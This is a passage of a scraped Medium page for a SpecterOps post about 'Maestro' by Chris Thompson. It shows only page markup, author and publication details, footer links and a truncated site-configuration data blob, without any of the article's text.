1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></span><span class="l h g f rr rs"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fspecter-ops-posts%2F9ed71d38d546&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;user=Chris+Thompson&amp;userId=1cf7ed8b7054&amp;source=---footer_actions--9ed71d38d546---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao la lq lr ab q fk ls lt" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lu"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="rt l ix"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F9ed71d38d546&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;source=---footer_actions--9ed71d38d546---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lw" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="rt l ix"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="ru rv rw rx ry l"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="rz bh r sa"></div><div class="sb l"><div class="ab sc sd se iz iy"><div class="sf sg sh si sj sk sl sm sn so ab cp"><div class="h k"><a href="https://posts.specterops.io/?source=post_page---post_publication_info--9ed71d38d546--------------------------------" rel="noopener follow"><div class="fj ab"><img alt="Posts By SpecterOps Team Members" class="sp ib ic cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*D-FDlfkqivRBQZoESrwtqw.png" width="48" height="48" loading="lazy"/><div class="sp l ic ib fs n fr sq"></div></div></a></div><div class="j i d"><a href="https://posts.specterops.io/?source=post_page---post_publication_info--9ed71d38d546--------------------------------" rel="noopener follow"><div class="fj ab"><img alt="Posts By SpecterOps Team Members" class="sp ss sr cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*D-FDlfkqivRBQZoESrwtqw.png" width="64" height="64" loading="lazy"/><div class="sp l sr ss fs n fr sq"></div></div></a></div><div class="j i d st ix"><div class="ab"><span><a class="bf b bg z su sv sw sx sy sz ta ev ew tb tc td fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fspecter-ops-posts&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;collection=Posts+By+SpecterOps+Team+Members&amp;collectionId=f05f8696e3cc&amp;source=post_page---post_publication_info--9ed71d38d546---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div><div class="ab co te"><div class="tf tg th pw pv l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" href="https://posts.specterops.io/?source=post_page---post_publication_info--9ed71d38d546--------------------------------" rel="noopener follow"><h2 class="pw-author-name bf tj tk tl tm tn to tp nh qw qx nl qz ra np rc rd bk"><span class="gn ti">Published in <!-- -->Posts By SpecterOps Team Members</span></h2></a><div class="tq ab ia"><div class="l ix"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" rel="noopener follow" href="/followers?source=post_page---post_publication_info--9ed71d38d546--------------------------------">4.7K Followers</a></span></div><div class="bf b bg z du ab jd"><span class="ir l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar iq" rel="noopener follow" href="/azure-key-vault-tradecraft-with-bark-24163abc8de3?source=post_page---post_publication_info--9ed71d38d546--------------------------------">Last published <!-- -->3 days ago</a></div></div><div class="tr l"><p class="bf b bg z bk"><span class="gn">Posts from SpecterOps team members on various topics relating information security</span></p></div></div></div><div class="h k"><div class="ab"><span><a class="bf b bg z su sv sw sx sy sz ta ev ew tb tc td fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fspecter-ops-posts&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;collection=Posts+By+SpecterOps+Team+Members&amp;collectionId=f05f8696e3cc&amp;source=post_page---post_publication_info--9ed71d38d546---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div></div><div class="ab sc sd se iz iy"><div class="sf sg sh si sj sk sl sm sn so ab cp"><div class="h k"><a tabindex="0" href="https://medium.com/@Mayyhem?source=post_page---post_author_info--9ed71d38d546--------------------------------" rel="noopener follow"><div class="l fj"><img alt="Chris Thompson" class="l fd by ic ib cx" src="https://miro.medium.com/v2/resize:fill:96:96/0*VB1kJkW5uCVpMaQ8" width="48" height="48" loading="lazy"/><div class="fr by l ic ib fs n ay sq"></div></div></a></div><div class="j i d"><a tabindex="0" href="https://medium.com/@Mayyhem?source=post_page---post_author_info--9ed71d38d546--------------------------------" rel="noopener follow"><div class="l fj"><img alt="Chris Thompson" class="l fd by sr ss cx" src="https://miro.medium.com/v2/resize:fill:128:128/0*VB1kJkW5uCVpMaQ8" width="64" height="64" loading="lazy"/><div class="fr by l sr ss fs n ay sq"></div></div></a></div><div class="j i d st ix"><div class="ab"><span><a class="bf b bg z su sv sw sx sy sz ta ev ew tb tc td fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1cf7ed8b7054&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;user=Chris+Thompson&amp;userId=1cf7ed8b7054&amp;source=post_page-1cf7ed8b7054--post_author_info--9ed71d38d546---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div><div class="ab co te"><div class="tf tg th pw pv l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" href="https://medium.com/@Mayyhem?source=post_page---post_author_info--9ed71d38d546--------------------------------" rel="noopener follow"><h2 class="pw-author-name bf tj tk tl tm tn to tp nh qw qx nl qz ra np rc rd bk"><span class="gn ti">Written by <!-- -->Chris Thompson</span></h2></a><div class="tq ab ia"><div class="l ix"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" href="https://medium.com/@Mayyhem/followers?source=post_page---post_author_info--9ed71d38d546--------------------------------" rel="noopener follow">135 Followers</a></span></div><div class="bf b bg z du ab jd"><span class="ir l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar iq" href="https://medium.com/@Mayyhem/following?source=post_page---post_author_info--9ed71d38d546--------------------------------" rel="noopener follow">5 Following</a></div></div><div class="tr l"><p class="bf b bg z bk"><span class="gn">Adversary Simulation @SpecterOps</span></p></div></div></div><div class="h k"><div class="ab"><span><a class="bf b bg z su sv sw sx sy sz ta ev ew tb tc td fa fb fc fd bm fe ff" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1cf7ed8b7054&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;user=Chris+Thompson&amp;userId=1cf7ed8b7054&amp;source=post_page-1cf7ed8b7054--post_author_info--9ed71d38d546---------------------follow_profile-----------" rel="noopener follow">Follow</a></span></div></div></div></div></div></div><div class="ts l"><div class="rz bh r tt tu tv tw tx"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab q cp"><h2 class="bf tj nx nz oa ob od oe of oh oi oj ol om on op oq bk">No responses yet</h2><div class="ab ty"><div><div class="bm" aria-hidden="false"><a class="tz ua" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--9ed71d38d546--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div></div></div><div class="ub uc ud ue uf l bx"><div class="h k j"><div class="rz bh ug uh"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ui ab kv ja"><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="uj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----9ed71d38d546--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20241122-185319-7bcdc08639"</script><script>window.__GRAPHQL_URI__ = "https://posts.specterops.io/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"This request is not using the cache middleware worker","group":"disabled","tags":["group-edgeCachePosts","post-9ed71d38d546","user-1cf7ed8b7054","collection-f05f8696e3cc"],"serverVariantState":"","middlewareEnabled":false,"cacheStatus":"DYNAMIC","shouldUseCache":false,"vary":[],"lohpSummerUpsellEnabled":false,"publicationHierarchyEnabledWeb":false,"postBottomResponsesEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"COLLECTION","id":"f05f8696e3cc","explicit":true},"viewerIsBot":false},"debug":{"requestId":"c93ee23c-4a1e-4786-835e-398a40ad2b7c","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-ad62e97db0c234c3305b6217125a6995-1d37257ebf950cad-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fposts.specterops.io\u002Fmaestro-9ed71d38d546","host":"posts.specterops.io","hostname":"posts.specterops.io","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"?source=rss----f05f8696e3cc---4"},"config":{"nodeEnv":"production","version":"main-20241122-185319-7bcdc08639","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20241122-185319-7bcdc08639","commit":"7bcdc08639c179dc5172558201a3fd3abc1b5db6"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results 